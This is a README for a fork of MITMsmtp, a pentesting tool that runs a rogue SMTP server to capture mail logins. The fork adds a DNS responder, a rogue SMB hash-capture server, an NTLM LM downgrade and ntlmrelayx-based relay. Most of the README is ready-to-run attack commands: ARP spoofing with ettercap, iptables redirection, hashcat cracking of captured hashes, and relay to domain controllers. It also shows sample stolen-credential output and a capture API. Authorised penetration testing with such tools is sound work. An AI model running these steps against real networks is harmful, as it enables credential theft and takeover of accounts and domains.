# MITMsmtp
MITMsmtp is an Evil SMTP Server for pentesting SMTP clients to catch login credentials and mails sent over plain or SSL/TLS encrypted connections. The idea is to catch sensitive emails sent by clients which are not correctly verifying the SMTP servers identity in SSL/TLS mode. MITMsmtp will catch username and password as well as the message itself. This way you might gain access to a companies mail server or catch information like password reset tokens or verification links sent by applications. Using those information you might gain more and more access to a system. MITMsmtp has been built to work together with MITM Attacks like ARP Spoofing to terminate encrypted connections. MITMsmtp could be used as a honeypot as well.

MITMsmtp offers a command line tool as well as an open Python3 API which can be used to build own tools for automated pentesting of applications.

## Fork Notice (Tantalum Labs)
This repository is a fork of the original MITMsmtp project by Robin Meis (upstream: https://github.com/RobinMeis/MITMsmtp) and is maintained by Tantalum Labs.

See `CHANGELOG.md` for a summary of the features and fixes added in this fork.

**Legal/Ethical Use:** Use only on systems you own or where you have explicit permission to test.

### Highlights (this fork)
* Optional built-in DNS responder for lab setups (`--enable-dns`, `--dns-ip`, `--print-dns`)
* Optional rogue SMB server to capture NTLM credentials (NetNTLMv1/NetNTLMv2 hashes) from SMB clients such as printers using "Scan to SMB" (`--enable-smb`, `--print-smb`)
* Optional NTLM "Force LM downgrade" to coax legacy clients into the weaker LMv1/NTLMv1 response (`--smb-force-lm-downgrade`)
* Optional NTLM relay mode that delegates live relaying to impacket's `ntlmrelayx` (`--relay`, optional dependency)
* All three servers (SMTP, DNS, SMB) can run together from a single runner so a device can be redirected and have its hostname resolved and credentials captured in one shot
* More robust SMTP handling (safe socket decoding, better `MAIL FROM`/`RCPT TO` parsing, cleaner `QUIT` handling)
* Authentication flow fixes (successful AUTH now responds with `235`, tolerate clients trying multiple AUTH methods)
* Helper script `MITMsmtp/smtp_test.py` to validate STARTTLS/SMTPS authentication in a controlled environment

## Compatibility
MITMsmtp has been tested against the SMTP client of Thunderbird 60.5.3 and some other SMTP clients.

### Connection Security
MITMsmtp supports the following connection security modes:
* Plaintext
* STARTTLS
* SSL/TLS

### Login Methods
MITMsmtp supports the following login methods:
* PLAIN
* LOGIN

Challenge-Response based authentication methods like CRAM-MD5, NTLM or Kerberos can't be supported as these methods require the server to know the cleartext password.

## Setup
MITMsmtp requires Python3 and setuptools. You might want to install git as well. Use the following command on Debian:

`apt install python3 python3-setuptools git`

Now just clone the MITMsmtp repository:

`git clone <this-fork-repo-url>`

Change into MITMsmtp directory and start the installation:

`sudo python3 setup.py install`

That's it!

### Updating
`git pull`

`sudo python3 setup.py install`

## Usage
*MITMsmtp can be used as standalone command line application and offers an easy to use Python3 API to integrate in your own project*

### Command Line (Tantalum Labs runner)
This fork's full-featured runner adds the optional DNS responder, rogue SMB server and NTLM relay modes on top of the SMTP capture. The SMTP, DNS, SMB and relay features can be enabled independently or combined.

After installing the package it is available as the `MITMsmtp` command and as `python3 -m MITMsmtp`. You can also run it directly from a checkout with `python3 MITMsmtp/MITMsmtp.py`. All three invocations accept the same flags:

* Show options: `MITMsmtp --help` (or `python3 -m MITMsmtp --help`, or `python3 MITMsmtp/MITMsmtp.py --help`)
* Plain SMTP: `MITMsmtp --port 587 --print-lines`
* STARTTLS: `MITMsmtp --STARTTLS --port 587 --print-lines`
* SMTPS (implicit TLS): `MITMsmtp --SSL --port 465 --print-lines`
* DNS responder + SMTP (lab use): `sudo MITMsmtp --enable-dns --dns-ip <YOUR_IP> --print-dns --print-lines`
* SMB credential capture (e.g. printer Scan to SMB): `sudo MITMsmtp --enable-smb --print-smb`
* SMB with forced LM downgrade: `sudo MITMsmtp --enable-smb --smb-force-lm-downgrade --print-smb`
* Everything at once (DNS + SMTP + SMB): `sudo MITMsmtp --enable-dns --dns-ip <YOUR_IP> --enable-smb --print-dns --print-smb --print-lines`
* NTLM relay via impacket (needs `pip install impacket`): `sudo MITMsmtp --relay --relay-target ldaps://dc01 --enable-dns --dns-ip <YOUR_IP>`

> Note: the default SMTP port for this runner is **587** (the legacy CLI below defaults to 8587).

### Command Line (legacy SMTP-only entrypoint)
The original SMTP-only CLI is preserved as the `MITMsmtp-legacy` command (also `python3 -m MITMsmtp.legacy`). It has no DNS/SMB/relay support and defaults to port 8587. Running `MITMsmtp-legacy --help` gives:
```
usage: MITMsmtp-legacy [-h] [--server_address SERVER_ADDRESS] [--port PORT]
                [--server_name SERVER_NAME] [--STARTTLS] [--SSL]
                [--certfile CERTFILE] [--keyfile KEYFILE] [--log LOG]
                [--disable-auth-plain] [--disable-auth-login] [--print-lines]

MITMsmtp is an Evil SMTP Server for pentesting SMTP clients to catch login
credentials and mails sent over plain or SSL encrypted connections.

optional arguments:
  -h, --help            show this help message and exit
  --server_address SERVER_ADDRESS
                        IP Address to listen on (default: all)
  --port PORT           Port to listen on (default: 8587)
  --server_name SERVER_NAME
                        FQDN of Server (default: smtp.example.com)
  --STARTTLS            Enables and requires STARTTLS Support (default: False)
  --SSL                 Enables SSL Support (default: False)
  --certfile CERTFILE   Certfificate for SSL Mode (default: Default MITMsmtp
                        Certificate)
  --keyfile KEYFILE     Key for SSL Mode (default: Default MITMsmtp Keyfile)
  --log LOG             Directory for mails and credentials
  --disable-auth-plain  Disables authentication using method PLAIN (default:
                        False)
  --disable-auth-login  Disables authentication using method LOGIN (default:
                        False)
  --print-lines         Prints communication between Client and MITMsmtp
                        (default: False)
```

When running `MITMsmtp-legacy` without any parameters it will start an unencrypted SMTP server on port 8587 on all interfaces. Pointing Thunderbird or any other SMTP client will give you the ability to test MITMsmtp. Please keep in mind that this default port differs from the SMTP default port.

As soon as a client has logged in, you will get the following information:

```
=== Login ===
Username: user@example.com
Password: SuperSecureAndUncrackablePassword
```

After the client has transmitted it's message, you will get basic information about the message:

```
=== Complete Message ===
Username  : user@example.com
Password  : SuperSecureAndUncrackablePassword
Client    : [192.168.178.42]
Sender    : user@example.com
Recipients: recipient-a@example.com
            recipient-b@example.com
```

If you want to get the full message, you have to enable logging.

### Logging
Running `MITMsmtp-legacy --log logdir` will enable logging in the legacy CLI. Please make sure that the directory exists. MITMsmtp will create n+1 files while n is the amount of received messages. Each mail will be written into a new file like it has been received. Additionally all received credentials are stored in `credentials.log`.

### SMB credential capture (printers / scanners)
Many multifunction printers, scanners and appliances offer a "Scan to SMB" (a.k.a. "Scan to network folder") feature that authenticates to an SMB share using a configured service account. When you can convince such a device to connect to a machine you control (for example via the bundled DNS responder, ARP spoofing, or simply by entering your host as the SMB target), this fork can stand up a rogue SMB server that captures the NTLM authentication and reconstructs the NetNTLMv1/NetNTLMv2 hash for offline cracking.

Start the runner with `--enable-smb` (port 445 requires root):

`sudo python3 MITMsmtp/MITMsmtp.py --enable-smb --print-smb`

Point the device's SMB/scan target at your host. When it authenticates you will see something like:

```
[SMB] *** NetNTLMv2 HASH CAPTURED *** from 192.168.1.50
[SMB] User: CONTOSO\scan-svc (workstation: RICOH-MFP)
[SMB] NetNTLMv2 (hashcat -m 5600)
[SMB] scan-svc::CONTOSO:1122334455667788:<NTProofStr>:<blob>
```

Crack the captured hash offline, e.g. with hashcat:

* NetNTLMv2: `hashcat -m 5600 captured.txt wordlist.txt`
* NetNTLMv1: `hashcat -m 5500 captured.txt wordlist.txt`

Useful options:

* `--smb-port` &mdash; listen on a non-standard port (default `445`)
* `--smb-challenge` &mdash; set the 8-byte server challenge as 16 hex chars (default `1122334455667788`; a fixed challenge lets you use precomputed/rainbow tables)
* `--smb-target-name` &mdash; the NetBIOS/domain name advertised to clients (default `WORKGROUP`)
* `--smb-force-lm-downgrade` &mdash; force clients into the legacy LMv1/NTLMv1 response so you capture the much weaker LM hash. This advertises a challenge without extended session security or target info, which makes the client compute the legacy 24-byte LM/NT responses (crack with `hashcat -m 5500`). Useful against older printers/devices that still honour the downgrade; modern hosts may refuse or send a null LM response.
* `--smb-log` &mdash; directory to append captured hashes to (`smb_credentials.log`)
* `--print-smb` &mdash; print SMB protocol activity

The SMB server only implements enough of SMB2 to elicit and capture the NTLM authentication; it does not serve files, so after credentials are captured the client is told the logon failed. Challenge-response auth means the cleartext password is not exposed directly &mdash; you capture a crackable hash. Combine `--enable-smb` with `--enable-dns` to also resolve the share's hostname to your machine.

### NTLM relay (impacket integration)
Capturing a hash (above) lets you crack it *offline*. **Relaying** is a different, live attack: instead of answering the client with our own challenge, the authentication is forwarded to a third-party target so that the target authenticates you *as the victim*, handing you an authenticated session you can act on (dump secrets, add a machine account, abuse LDAP ACLs, proxy the session over SOCKS, and so on).

Rather than reimplement this, MITMsmtp delegates relaying to [impacket](https://github.com/fortra/impacket)'s mature `ntlmrelayx`. The `--relay` flag builds and runs `ntlmrelayx` from MITMsmtp's options and streams its output prefixed with `[RELAY]`.

Install the optional dependency first:

`pip install impacket`  (or `pip install MITMsmtp[relay]`)

Examples:

* Relay to a single SMB target: `sudo python3 MITMsmtp/MITMsmtp.py --relay --relay-target smb://10.0.0.5`
* Cross-protocol relay to LDAPS with SOCKS: `sudo python3 MITMsmtp/MITMsmtp.py --relay --relay-target ldaps://dc01 --relay-socks`
* Multiple targets from a file: `sudo python3 MITMsmtp/MITMsmtp.py --relay --relay-targets-file targets.txt`
* DNS coercion + relay (the useful combo): `sudo python3 MITMsmtp/MITMsmtp.py --enable-dns --dns-ip <YOUR_IP> --relay --relay-target ldaps://dc01`
* See the exact `ntlmrelayx` command without running it: `python3 MITMsmtp/MITMsmtp.py --relay --relay-target smb://10.0.0.5 --relay-dry-run`

Relay options:

* `--relay-target TARGET` &mdash; a relay target such as `smb://host`, `ldap://host`, `ldaps://host`, `http://host`; repeatable
* `--relay-targets-file FILE` &mdash; a file of targets, one per line (`ntlmrelayx -tf`)
* `--relay-socks` &mdash; start the `ntlmrelayx` SOCKS proxy so relayed sessions can be reused (`-socks`)
* `--relay-ip IP` &mdash; bind `ntlmrelayx`'s listeners to a specific IP (`-ip`)
* `--relay-output-prefix PREFIX` &mdash; file prefix for dumped loot (`-of`)
* `--relay-no-smb2support` &mdash; omit `-smb2support` (it is passed by default; most clients use SMB2+)
* `--relay-extra "..."` &mdash; raw arguments passed verbatim to `ntlmrelayx` for anything not exposed above (e.g. `--relay-extra "--remove-mic -debug"`)
* `--relay-bin PATH` &mdash; explicit path to `ntlmrelayx(.py)` if it is not on your `PATH`
* `--relay-dry-run` &mdash; print the command that would be run, then exit

Important constraints:

* **Port ownership:** `ntlmrelayx` binds its own SMB (445) and HTTP (80) listeners, so `--relay` is **mutually exclusive with `--enable-smb`**. The DNS responder (`--enable-dns`) and the SMTP server still run alongside it.
* **Signing kills SMB&rarr;SMB relay:** relaying only works when the *target* does not enforce session signing (we never learn the session key). Modern domain controllers require SMB signing, which is why cross-protocol relay (SMB&rarr;LDAP/LDAPS for RBCD or shadow credentials, SMB&rarr;HTTP for ADCS ESC8) is usually the productive path. This is a property of the target, not of MITMsmtp.
* You are not relaying a "hash" &mdash; you are relaying the live NTLMSSP tokens, so relay mode does not also produce an offline-crackable hash for that authentication. Choose `--relay` (live) or `--enable-smb` (offline capture) per engagement.

### Encryption
Some clients fallback to unencrypted mode if you don't offer SSL/TLS. Always make sure to test this! For clients which don't fallback, you may want to test the encrypted mode. Please keep in mind, that a correctly configured client won't be vulnerable to this attack. You will be unable to fake a trusted certificate for a validated common name and thus the client will stop connection before sending credentials. However some clients don't implement proper certificate validation. This is where this attack starts.

#### STARTTLS
STARTTLS is available for MTIMsmtp. When enabled it will enforce STARTTLS.

To use MITMsmtp with the example certificates run `MITMsmtp --STARTTLS`.

#### SSL/TLS
To run MITMsmtp in SSL mode you need a certificate and the according key. You can use the example in certs/. For some clients you might need to generate own certificates to bypass certain validation steps.

To use MITMsmtp with the example certificates run `MITMsmtp --SSL`.

### API
For an example you might want to consult `MITMsmtp/__main__.py`. More docs will be available soon!

The SMB server is also usable as a small standalone Python API. Provide a `capture_callback` to receive each captured credential as a dict (`username`, `domain`, `workstation`, `version`, `hashcat_mode`, `credential`):

```python
from MITMsmtp.SMBServer import SMBServer

def on_capture(client_ip, result):
    print("Captured %s from %s: %s" % (result["version"], client_ip, result["credential"]))

smb = SMBServer(listen_address="0.0.0.0", listen_port=445,
                target_name="WORKGROUP", force_lm_downgrade=False,
                capture_callback=on_capture)
smb.start()
# ... run until done ...
smb.stop()
```

### Helper: smtp_test.py
This fork includes `MITMsmtp/smtp_test.py`, a small script to validate SMTP authentication against a server that you control (useful for verifying TLS mode selection and reproducing client auth behavior in a lab).

Examples:

* STARTTLS (port defaults to 587): `python3 MITMsmtp/smtp_test.py --startls --smtp 127.0.0.1 --user test@example.com --pass testpass --insecure`
* SMTPS / implicit TLS (port defaults to 465): `python3 MITMsmtp/smtp_test.py --ssl --smtp 127.0.0.1 --user test@example.com --pass testpass --insecure`
* Specify a port: `python3 MITMsmtp/smtp_test.py --startls --smtp 127.0.0.1:587 --user test@example.com --pass testpass --debug`

## MITM
This section shows the usage of MITMsmtp if you are able to intercept the victims traffic.

### ARP Spoofing
ARP Spoofing is one way to get between Victim and Router. In case you have the ability to modify your routers settings, you might skip this step. There are many other ways to perform MITM Attacks like DHCP Race-Conditions or DNS Spoofing. These instructions are just a basic idea how to use MITMsmtp. First of all you need the victims and the routers IP address. Make also sure that your client is connected to the same subnet.

In this example the Routers IP will be *192.168.42.1* and the Victims IP will be *192.168.42.24*. Run the following commands as root.

First of all we are going to enable forwarding mode:

`sysctl -w net.ipv4.ip_forward=1`

To make sure that out victim doesn't find a way around us, block ICMP redirects:

`sysctl -w net.ipv4.conf.all.send_redirects=0`

Next we create a port forwarding rule from SMTP default port 587 to MITMsmtp (legacy default is 8587; adjust to match your local listener port).

`iptables -t nat -A PREROUTING -p tcp --destination-port 587 -j REDIRECT --to-port 8587`

To start ARP Spoofing you will need ettercap. Run the following command and replace the IP addresses according to your setup:

`ettercap -T -M arp /192.168.42.24/ /192.168.42.1/`

Finally you can fire up MITMsmtp (using the legacy CLI for its directory-based mail/credential logging):

`MITMsmtp-legacy --log log/`

#### Limitations
As we perform a port forward, MITMsmtp can't determine the original packet destination. This means that MITMsmtp can't log the real SMTP server name or IP. If you need these information, just run wireshark while catching mails using MITMsmtp and filter for `tcp.port==587` or `dns`. This way you will be able to get the domain name as well as the original IP.

## Reference
[1] https://tools.ietf.org/html/rfc5321

[2] http://www.samlogic.net/articles/smtp-commands-reference-auth.htm

[3] https://tools.ietf.org/html/rfc3207
